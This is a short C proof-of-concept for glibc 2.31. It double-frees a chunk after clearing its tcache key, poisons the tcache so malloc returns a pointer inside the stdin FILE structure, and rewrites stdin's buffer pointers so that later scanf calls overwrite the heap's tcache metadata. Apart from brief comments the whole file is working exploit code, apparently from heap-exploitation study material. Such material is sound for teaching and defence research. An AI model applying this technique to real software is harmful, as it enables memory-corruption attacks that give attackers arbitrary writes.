// glibc: 2.31

#include <stdio.h>
#include <stdlib.h>

char dummy[0x10];
int main()
{
    setvbuf(stdin, 0, 2, 0);
    scanf("%s", dummy); // init stdin
    int64_t *ptr = (int64_t *)malloc(0x18);
    int64_t heap_base = ptr - 0x2a0/8;  // 0x6b0/8; // without setvbuf offset

    free(ptr);
    ptr[1] = 0;
    free(ptr);                     // tcache_count[0] = 2
    
    ptr[0] = &stdin->_IO_write_ptr;
    ptr = (int64_t *)malloc(0x18);
    ptr = (int64_t *)malloc(0x18); // stdin->_IO_write_ptr , now stdin->_IO_write_end = 0
    
    ptr[1] = heap_base + 0x2a0;
    ptr[2] = heap_base;             // stdin->_IO-buf_base
    scanf("%s", dummy);             // now we can overwrite tcache
    scanf("%s", dummy);             // infinitely
}

